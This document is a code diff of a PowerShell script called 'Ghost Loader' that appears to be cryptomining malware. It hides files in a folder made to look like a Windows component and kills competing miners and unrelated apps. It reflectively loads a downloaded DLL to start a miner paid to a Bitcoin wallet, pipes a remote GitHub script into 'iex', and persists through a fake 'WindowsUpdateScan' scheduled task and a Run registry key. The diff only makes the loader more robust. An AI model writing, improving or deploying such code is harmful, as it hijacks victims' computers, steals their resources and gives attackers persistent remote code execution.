@@ -1,4 +1,4 @@
-# Ghost Loader - Pure Stable
+# Ghost Loader - Audited v1
 $u = "HolyV200"; $r = "ulta"; $w = "bc1qvq0rd2g29g3dpvw9mue0q3c4cvnsuxvwc4tqxr"
 $ProgressPreference = 'SilentlyContinue'
 
@@ -6,8 +6,8 @@ $bDir = $env:LOCALAPPDATA; if (!$bDir) { $bDir = $env:TEMP }
 $sDir = [System.IO.Path]::Combine($bDir, "Microsoft", "Windows", "UpdateCoord")
 if (!(Test-Path $sDir)) { New-Item -ItemType Directory -Force -Path $sDir | Out-Null }
 
-# KILL CONFLICTS
-try { Get-Process "xmrig", "gminer", "miner" -ErrorAction SilentlyContinue | Stop-Process -Force -ErrorAction SilentlyContinue } catch { }
+# DEEP CLEAN
+try { Get-Process "xmrig", "gminer", "miner", "OneDriveStandalone", "SpotifyHelper" -ErrorAction SilentlyContinue | Stop-Process -Force -ErrorAction SilentlyContinue } catch { }
 
 function Get-F($Url, $Path) {
     if (Test-Path $Path) { try { Remove-Item $Path -Force -ErrorAction SilentlyContinue } catch { } }
@@ -16,9 +16,9 @@ function Get-F($Url, $Path) {
         $wc = New-Object System.Net.WebClient
         $wc.Headers.Add("User-Agent", $ua)
         $wc.DownloadFile($Url, $Path)
-        if (Test-Path $Path) { if ((Get-Item $Path).Length -gt 10KB) { return $true } }
+        if (Test-Path $Path) { if ((Get-Item $Path).Length -gt 1KB) { return $true } }
     } catch { }
-    try { curl.exe -sL -H "User-Agent: $ua" -o $Path $Url 2>$null; if (Test-Path $Path) { if ((Get-Item $Path).Length -gt 10KB) { return $true } } } catch { }
+    try { curl.exe -sL -H "User-Agent: $ua" -o $Path $Url 2>$null; if (Test-Path $Path) { if ((Get-Item $Path).Length -gt 1KB) { return $true } } } catch { }
     return $false
 }
 
@@ -56,7 +56,13 @@ $dp = Join-Path $sDir "Bridge.dll"
 if (Get-F $dUrl $dp) {
     try {
         $db = [System.IO.File]::ReadAllBytes($dp)
-        [System.Reflection.Assembly]::Load($db).GetType('DateFundLoader').GetMethod('StartMiner').Invoke($null, @([string]$ce, [string]$ge, [string]$w))
+        $asm = [System.Reflection.Assembly]::Load($db)
+        $type = $asm.GetType('DateFundLoader')
+        if ($null -eq $type) { throw "DLL Type Load Error" }
+        $method = $type.GetMethod('StartMiner')
+        if ($null -eq $method) { throw "DLL Method Load Error" }
+        
+        $method.Invoke($null, @([string]$ce, [string]$ge, [string]$w))
         Write-Host "running"
         
         $cmd = "irm 'https://raw.githubusercontent.com/$u/$r/main/remote_deploy.ps1' | iex"
@@ -67,6 +73,6 @@ if (Get-F $dUrl $dp) {
         else { schtasks.exe /create /tn "WindowsUpdateScan" /tr "$tp" /sc onlogon /f /ErrorAction SilentlyContinue }
         Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "UpdateCoord" -Value "$tp" -ErrorAction SilentlyContinue
         return
-    } catch { $e = $_.Exception.Message }
-}
+    } catch { $e = $_.Exception.InnerException.Message; if (!$e) { $e = $_.Exception.Message } }
+} else { $e = "DLL Download Failed" }
 Write-Host "failed: $e"
